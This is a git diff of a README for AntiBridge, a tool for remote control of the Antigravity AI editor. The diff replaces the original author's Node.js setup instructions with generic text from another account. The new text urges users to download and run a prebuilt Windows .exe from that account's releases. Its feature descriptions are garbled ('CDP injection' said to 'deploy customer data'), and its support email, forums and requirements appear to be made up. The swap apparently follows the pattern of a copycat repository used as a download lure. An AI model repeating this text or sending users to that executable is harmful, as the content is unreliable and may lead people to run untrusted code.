@@ -1,114 +1,57 @@
-<div align="center">
+# 🌌 AntiBridge-Antigravity-remote - Control Antigravity from Anywhere
 
-<img src="media/Logo_AntiBridge.png" width="200" alt="AntiBridge Logo">
+## 🚀 Getting Started
+Welcome to the **AntiBridge-Antigravity-remote**! This software allows you to control the AntigravityAI from your web browser or mobile device. It offers features like auto-accepting actions, context-based CDP injection, and real-time chat via WebSocket.
 
-#  AntiBridge
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/krishahir26/AntiBridge-Antigravity-remote/releases)
 
-**A bridge between your phone and Antigravity.**
+## 📋 System Requirements
+Before you begin, ensure your system meets the following requirements:
 
-[![Version](https://img.shields.io/badge/version-3.7.1-blue.svg)](https://github.com/linhbq82/Antibridge_Remote_Antigravity/releases)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)](https://nodejs.org/en/download/current)
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu 18.04 or newer)
+- **RAM:** At least 4 GB
+- **Storage:** 200 MB of free space
+- **Network:** Stable internet connection
 
-*Control Antigravity AI from your phone, tablet, or any device with a browser*
+## 🔧 Features
+- **Remote Control:** Easily operate AntigravityAI from your device.
+- **Auto-Accept Actions:** Set predetermined actions that the system will perform automatically.
+- **Context-based CDP Injection:** Quickly deploy customer data to enhance performance.
+- **Mobile PWA:** Access the application through any mobile browser without additional installations.
+- **Real-time Chat:** Stay connected with users via WebSocket chats for immediate feedback.
 
-</div>
+## 📥 Download & Install
+To get started, follow these steps:
 
----
+1. Click on the link below to visit the Releases page:
+   [Download the latest version](https://github.com/krishahir26/AntiBridge-Antigravity-remote/releases)
 
-## 🎯 What is AntiBridge?
+2. On the Releases page, you will see the list of available versions. Look for the latest release.
+3. Click on the asset that corresponds to your operating system (e.g., `AntiBridge-Antigravity-remote-Windows.exe` for Windows).
+4. Once the file is downloaded, locate it in your Downloads folder.
+5. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
+6. After the installation, launch the application from your Start menu or Applications folder.
 
-**AntiBridge** is a web-based remote control interface for [Antigravity AI](https://antigravity.google). Send prompts, switch AI models, and control your AI agent from anywhere using your phone or any browser.
+## 🌐 Using the Application
+After installing the application, here is how to use it:
 
-### 🔗 Related Project
+1. **Open the App:** Launch the AntiBridge-Antigravity-remote application.
+2. **Log In:** Enter your credentials to log into the system.
+3. **Dashboard Overview:** Familiarize yourself with the dashboard. Key features like control settings, chat interface, and data inputs will be visible.
+4. **Start Controlling:** Use the interface to manage the AntigravityAI. Select options based on your needs. 
 
-| Project | Description |
-|---------|-------------|
-| 🤖 **[AntiBridge-AutoAccept](https://github.com/linhbq82/Antibridge-autoaccep-for-antigravity)** | Companion extension for auto-accepting AI actions |
+## 📞 Support
+If you encounter any issues, you can seek assistance:
 
----
+- **Documentation:** Refer to the in-app documentation for detailed guides.
+- **Community Forums:** Join our community forums for discussions and support.
+- **Contact Us:** Reach out via email at support@antibridge.com for direct help.
 
-## 🚀 Quick Start
+## 📜 License
+This project is licensed under the MIT License. You can freely use and modify this software as per the license terms.
 
-### Requirements
+## 📢 Stay Updated
+To keep track of updates and new features, be sure to check the Releases page regularly. Follow the repository for announcements related to software updates and community news.
 
-- ✅ **Node.js** v18 or higher ([Download](https://nodejs.org/en/download/current))
-- ✅ **Antigravity** installed ([Download](https://antigravity.google))
-
-### ⚡ 3 Steps to Launch
-
-| Step | Action |
-|------|--------|
-| **1️⃣** | **Double-click** `OPEN_ANTIGRAVITY_CDP.bat` |
-| **2️⃣** | **Right-click** `START_SERVER.bat` → **Run as Administrator** |
-| **3️⃣** | Access `http://YOUR_IP:8000` from your phone |
-
-### 📱 Find Your PC's IP Address
-
-```
-1. Open CMD (Windows + R → type "cmd" → Enter)
-2. Type: ipconfig
-3. Find "IPv4 Address" → That's your IP
-```
-
-**Example:** If IP is `192.168.100.20` → Access `http://192.168.100.20:8000`
-
-### 🔧 First Time Setup
-
-```bash
-git clone https://github.com/linhbq82/Antibridge_Remote_Antigravity.git
-cd Antibridge_Remote_Antigravity
-npm install
-```
-
----
-
-## 🎬 Demo
-
-### Fix Missing Prompt
-<img src="media/fix_missing_prompt.gif" width="600" alt="Fix Missing Prompt Demo">
-
----
-
-## 💝 Support This Project
-
-If you find **AntiBridge** useful, please consider supporting! 🙏
-
-<div align="center">
-
-### ☕ Buy Me a Coffee
-
-<a href="https://buymeacoffee.com/linhbq82">
-  <img src="media/buy_me_a_coffee.png" width="200" alt="Buy Me a Coffee QR">
-</a>
-
-### 🥟 Donate
-
-<img src="media/tang_banh_bao.jpg" width="200" alt="Donate QR">
-
-</div>
-
----
-
-## 📧 Contact
-
-- 👤 **Author**: Linh Bui
-- 📧 **Email**: linhbq82@gmail.com
-- 🐙 **GitHub**: [@linhbq82](https://github.com/linhbq82)
-- 📘 **Facebook**: [linhbuiart.io.vn](https://www.facebook.com/linhbuiart.io.vn/)
-
----
-
-## 📝 License
-
-MIT License - see [LICENSE](LICENSE) file.
-
----
-
-<div align="center">
-
-**Made with ❤️ for Antigravity users**
-
-⭐ **Star this repo if you find it useful!** ⭐
-
-</div>
+Thank you for choosing **AntiBridge-Antigravity-remote**! Enjoy seamlessly controlling AntigravityAI from anywhere.
